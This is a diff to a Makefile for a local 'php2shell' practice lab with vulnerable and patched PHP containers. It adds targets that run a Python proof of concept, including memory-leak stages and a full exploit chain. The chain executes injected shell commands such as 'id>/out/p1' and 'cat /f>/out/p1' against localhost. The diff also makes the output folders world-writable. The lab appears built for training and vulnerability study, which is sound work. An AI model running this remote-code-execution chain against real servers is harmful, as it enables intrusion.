@@ -12,8 +12,11 @@ PATCHED_PORT ?= 8089
 # Clearly synthetic: never the real THM flag.
 SYNTHETIC_FLAG ?= FLAG{php2shell_lab_synthetic_flag_redacted}
 
+URL ?= http://127.0.0.1:$(VULN_PORT)/index.php
+CMD ?= id>/out/p1
+
 .PHONY: help env runtime compose-check lab-up lab-up-patched lab-down lab-ps lab-logs \
-        lab-smoke lab-reset check test clean
+        lab-smoke lab-reset doctor smoke leak exploit detect matrix check test clean
 
 help: ## Show this help
 	@echo "php2shell lab -- make targets"
@@ -28,6 +31,12 @@ help: ## Show this help
 	@echo "  make lab-logs         follow target logs"
 	@echo "  make lab-smoke        GET / and print the response"
 	@echo "  make lab-reset        clear proof output from runtime/out"
+	@echo "  make doctor           check Python, Docker, containers and config"
+	@echo "  make smoke            GET $(URL)"
+	@echo "  make leak             run the heap/libphp leak stages"
+	@echo "  make exploit          full chain (CMD='cat /f>/out/p1' for the flag)"
+	@echo "  make detect           passive PHP fingerprint + optional probe"
+	@echo "  make matrix           vulnerable vs patched control"
 	@echo "  make check            byte-compile + unit tests"
 	@echo "  make test             unit tests only"
 	@echo "  make clean            remove __pycache__ and build artefacts"
@@ -65,12 +74,31 @@ lab-logs: env
 	@$(COMPOSE) logs -f --tail=100 vuln
 
 lab-smoke:
-	@curl -fsS "http://127.0.0.1:$(VULN_PORT)/"
+	@curl -fsS "$(URL)"
 
 lab-reset:
 	@rm -rf runtime/out/* runtime/patched/out/*
 	@mkdir -p runtime/out runtime/patched/out
+	@chmod 0777 runtime/out runtime/patched/out
 	@echo "runtime output cleared"
+
+doctor: env runtime
+	@python3 -m poc doctor
+
+smoke: env runtime
+	@python3 -m poc smoke -u "$(URL)"
+
+leak: env runtime
+	@python3 -m poc leak -u "$(URL)"
+
+exploit: env runtime
+	@python3 -m poc exploit -u "$(URL)" -c '$(CMD)'
+
+detect: env runtime
+	@python3 -m poc detect -u "$(URL)"
+
+matrix: env runtime
+	@python3 -m poc matrix
 
 check:
 	@python3 -m compileall -q poc tests scripts
